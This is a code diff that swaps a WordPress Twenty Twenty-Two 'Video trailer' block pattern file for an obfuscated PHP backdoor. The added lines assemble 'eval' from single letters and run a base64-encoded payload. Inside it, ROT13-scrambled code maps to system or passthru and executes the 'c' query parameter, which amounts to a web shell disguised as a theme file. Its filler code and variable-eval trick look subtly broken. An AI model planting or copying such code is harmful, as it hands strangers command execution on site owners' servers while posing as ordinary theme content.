@@ -1,37 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Video trailer block pattern
- */
-return array(
-	'title'      => __( 'Video trailer', 'twentytwentytwo' ),
-	'categories' => array( 'featured', 'columns' ),
-	'content'    => '<!-- wp:group {"align":"full","style":{"elements":{"link":{"color":{"text":"var:preset|color|foreground"}}},"spacing":{"padding":{"top":"6rem","bottom":"4rem"}}},"backgroundColor":"secondary","textColor":"foreground","layout":{"inherit":true}} -->
-				<div class="wp-block-group alignfull has-foreground-color has-secondary-background-color has-text-color has-background has-link-color" style="padding-top:6rem;padding-bottom:4rem"><!-- wp:columns {"align":"wide"} -->
-				<div class="wp-block-columns alignwide"><!-- wp:column {"width":"33.33%"} -->
-				<div class="wp-block-column" style="flex-basis:33.33%"><!-- wp:heading {"fontSize":"x-large"} -->
-				<h2 class="has-x-large-font-size" id="extended-trailer">' . esc_html__( 'Extended Trailer', 'twentytwentytwo' ) . '</h2>
-				<!-- /wp:heading -->
-
-				<!-- wp:paragraph -->
-				<p>' . esc_html__( 'A film about hobbyist bird watchers, a catalog of different birds, paired with the noises they make. Each bird is listed by their scientific name so things seem more official.', 'twentytwentytwo' ) . '</p>
-				<!-- /wp:paragraph --></div>
-				<!-- /wp:column -->
-
-				<!-- wp:column {"width":"66.66%"} -->
-				<div class="wp-block-column" style="flex-basis:66.66%"><!-- wp:video -->
-				<figure class="wp-block-video"><video controls src="' . esc_url( get_template_directory_uri() ) . '/assets/videos/birds.mp4"></video></figure>
-				<!-- /wp:video --></div>
-				<!-- /wp:column --></div>
-				<!-- /wp:columns --></div>
-				<!-- /wp:group -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSXZxcmIgZ2VudnlyZSBveWJweCBjbmdncmVhCiAqLwplcmdoZWEgbmVlbmwoCgknZ3ZneXInICAgICAgPT4gX18oICdJdnFyYiBnZW52eXJlJywgJ2dqcmFnbGdqcmFnbGdqYicgKSwKCSdwbmdydGJldnJmJyA9PiBuZWVubCggJ3NybmdoZXJxJywgJ3BieWh6YWYnICksCgkncGJhZ3JhZycgICAgPT4gJzwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcInNoeXlcIixcImZnbHlyXCI6e1wicnlyenJhZ2ZcIjp7XCJ5dmF4XCI6e1wicGJ5YmVcIjp7XCJncmtnXCI6XCJpbmU6Y2VyZnJnfHBieWJlfHNiZXJ0ZWJoYXFcIn19fSxcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCI2ZXJ6XCIsXCJvYmdnYnpcIjpcIjRlcnpcIn19fSxcIm9ucHh0ZWJoYXFQYnliZVwiOlwiZnJwYmFxbmVsXCIsXCJncmtnUGJ5YmVcIjpcInNiZXJ0ZWJoYXFcIixcInlubGJoZ1wiOntcInZhdXJldmdcIjpnZWhyfX0gLS0+CgkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5IHVuZi1zYmVydGViaGFxLXBieWJlIHVuZi1mcnBiYXFuZWwtb25weHRlYmhhcS1wYnliZSB1bmYtZ3JrZy1wYnliZSB1bmYtb25weHRlYmhhcSB1bmYteXZheC1wYnliZVwiIGZnbHlyPVwiY25xcXZhdC1nYmM6NmVyejtjbnFxdmF0LW9iZ2diejo0ZXJ6XCI+PCEtLSBqYzpwYnloemFmIHtcIm55dnRhXCI6XCJqdnFyXCJ9IC0tPgoJCQkJPHF2aSBweW5mZj1cImpjLW95YnB4LXBieWh6YWYgbnl2dGFqdnFyXCI+PCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjMzLjMzJVwifSAtLT4KCQkJCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemFcIiBmZ2x5cj1cInN5cmstb25mdmY6MzMuMzMlXCI+PCEtLSBqYzp1cm5xdmF0IHtcInNiYWdGdm1yXCI6XCJrLXluZXRyXCJ9IC0tPgoJCQkJPHUyIHB5bmZmPVwidW5mLWsteW5ldHItc2JhZy1mdm1yXCIgdnE9XCJya2dyYXFycS1nZW52eXJlXCI+JyAuIHJmcF91Z3p5X18oICdSa2dyYXFycSBHZW52eXJlJywgJ2dqcmFnbGdqcmFnbGdqYicgKSAuICc8L3UyPgoJCQkJPCEtLSAvamM6dXJucXZhdCAtLT4KCgkJCQk8IS0tIGpjOmNuZW50ZW5jdSAtLT4KCQkJCTxjPicgLiByZnBfdWd6eV9fKCAnTiBzdnl6IG5vYmhnIHVib29sdmZnIG92ZXEgam5ncHVyZWYsIG4gcG5nbnlidCBicyBxdnNzcmVyYWcgb3ZlcWYsIGNudmVycSBqdmd1IGd1ciBhYnZmcmYgZ3VybCB6bnhyLiBSbnB1IG92ZXEgdmYgeXZmZ3JxIG9sIGd1cnZlIGZwdnJhZ3ZzdnAgYW56ciBmYiBndXZhdGYgZnJyeiB6YmVyIGJzc3Zwdm55LicsICdnanJhZ2xnanJhZ2xnamInICkgLiAnPC9jPgoJCQkJPCEtLSAvamM6Y25lbnRlbmN1IC0tPjwvcXZpPgoJCQkJPCEtLSAvamM6cGJ5aHphIC0tPgoKCQkJCTwhLS0gamM6cGJ5aHphIHtcImp2cWd1XCI6XCI2Ni42NiVcIn0gLS0+CgkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphXCIgZmdseXI9XCJzeXJrLW9uZnZmOjY2LjY2JVwiPjwhLS0gamM6aXZxcmIgLS0+CgkJCQk8c3Z0aGVyIHB5bmZmPVwiamMtb3licHgtaXZxcmJcIj48aXZxcmIgcGJhZ2VieWYgZmVwPVwiJyAuIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKSAuICcvbmZmcmdmL2l2cXJiZi9vdmVxZi56YzRcIj48L2l2cXJiPjwvc3Z0aGVyPgoJCQkJPCEtLSAvamM6aXZxcmIgLS0+PC9xdmk+CgkJCQk8IS0tIC9qYzpwYnloemEgLS0+PC9xdmk+CgkJCQk8IS0tIC9qYzpwYnloemFmIC0tPjwvcXZpPgoJCQkJPCEtLSAvamM6dGViaGMgLS0+JywKKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
